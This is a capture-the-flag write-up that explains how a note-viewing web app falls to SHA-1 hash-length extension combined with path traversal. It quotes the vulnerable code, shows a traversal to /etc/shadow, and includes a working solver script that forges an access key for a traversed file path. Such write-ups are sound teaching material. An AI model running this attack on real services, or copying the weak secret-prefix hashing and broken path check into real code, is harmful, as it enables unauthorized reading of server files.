# cybercybernote

## Description

```
Somebody has leaked files from one of our servers and we have gotten wind that it might have happened through our super secure cyber note taking service. Can you figure out how those darn criminals cybered through those notes unauthorized?
```

## Categories

- `crypto`

## Provided Files

- `cybercybernote.zip`

## Solve Process

This challenge was a combination of path traversal and abusing hash-length extension on sha1

```py
# --- snip --- #
@app.route('/', methods=['GET'])
def index():
    notes = list_notes()

    return render_template('index.html', notes=notes)

@app.route('/view')
def view_note():
    params = parse_qs(request.query_string)

    filename = params.get(b'filename', [b''])[0]
    provided_key = params.get(b'key', [b''])[0]

    if not filename or not provided_key:
        return abort(404)

    return render_template('view.html', filename=filename, content=get_note(filename, provided_key))
# --- snip --- #
def ensure_string(value):
    if isinstance(value, bytes):
        return value.decode(errors='ignore')
    return value

def safe_path(*parts):
    return os.path.normpath(os.path.join(*parts))
# --- snip --- #
def generate_access_key(filename):
    if isinstance(filename, str):
        filename = filename.encode()
    return sha1(SECRET_KEY + filename).hexdigest()

def list_notes():
    notes = []

    for filename in os.listdir(NOTES_DIR):
        if filename.endswith('.txt'):
            notes.append((filename, generate_access_key(filename)))

    return notes


def get_note(filename, access_key):
    print(generate_access_key(filename))
    if ensure_string(access_key) != generate_access_key(filename):
        raise PermissionError(f"Access denied for note '{filename}'")

    filepath = safe_path(NOTES_DIR, ensure_string(filename))
    if not os.path.exists(filepath):
        raise FileNotFoundError(f"Note '{filename}' not found")

    with open(filepath, 'r') as f:
        content = f.read()

    return content
# --- snip --- #
```

A lot of code to digest, but as we see in the above snippets, the `/` route calls `list_note()`, which we can abuse to get a file with its access key that is generate by `generate_access_key()`.

Having this knowledge, we know that SHA1 which is being used here is vulnerable to a [hash-length extension](https://en.wikipedia.org/wiki/Length_extension_attack). In short terms this means, if I have one output of the hash function with a known input, I can generate a second valid hash by extending the input to the hash function accordingly.

I found a great python library to do this, so I don't have to code it from scratch (because I'm lazy), which is called [hlextend](https://github.com/stephenbradshaw/hlextend).

The second things to spot in the application code is that `safe_path` is actually not doing its job at all because it still allows for path traversal.

```bash
Python 3.13.3 on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> def safe_path(*parts):
...     return os.path.normpath(os.path.join(*parts))
>>> safe_path("/home/user/", "../../etc/shadow")
'/etc/shadow'
```

This is practially all the knowledge we need to write our final solver script.

```py
# https://github.com/stephenbradshaw/hlextend

import requests
import hlextend
from urllib.parse import quote

FILENAME = "/../../flag.txt"
KNOWN_FILE = "B.txt"
KNOWN_HASH = "e0c9c6e7147e40bb8ef6665c9b8363d63e30cd79"
SHA = hlextend.new('sha1')
EXTENSION = SHA.extend(FILENAME.encode(), KNOWN_FILE.encode(), 16, KNOWN_HASH)
DIGEST = SHA.hexdigest()

CHALLENGE_HOST = "yv9s2tubonndkb47.dyn.acsc.land"
REQUEST_PAYLOAD = f"view?filename={quote(EXTENSION)}&key={DIGEST}"

print(f"[+] Payload is: {REQUEST_PAYLOAD}")
print("[+] Sending payload")
RESPONE = requests.get(url=f"https://{CHALLENGE_HOST}/{REQUEST_PAYLOAD}", allow_redirects=True)
if RESPONE.status_code == 200:
    print("[+] Success")
    print(f"[+] Flag: {RESPONE.text}")
else:
    print(f"[-] Payload returned with status: {RESPONE.status_code}")
    print(f"[-] Error: {RESPONE.text}")
```

This solver script is a bit dirtier than most of the ones I write but it does the job, which yields us another flag.
